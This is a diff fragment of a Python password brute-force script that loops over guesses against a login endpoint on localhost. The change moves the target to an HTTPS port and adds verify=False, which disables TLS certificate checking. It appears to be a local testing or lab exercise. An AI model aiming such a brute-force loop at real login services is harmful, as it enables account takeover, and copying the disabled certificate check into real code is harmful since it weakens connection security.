@@ -13,9 +13,9 @@ def bruteforce_attack():
             attempts += 1
             guess = ''.join(guess)
             print(f"Tryng {guess}")
-            url = "http://localhost:8081/login"
+            url = "https://localhost:9443/login"
             body = {'username':'test', 'password': guess}
-            resp = session.post(url, json=body)
+            resp = session.post(url, json=body, verify=False)
             if resp.status_code == 200:
                 return (attempts, guess)
         time.sleep(1)
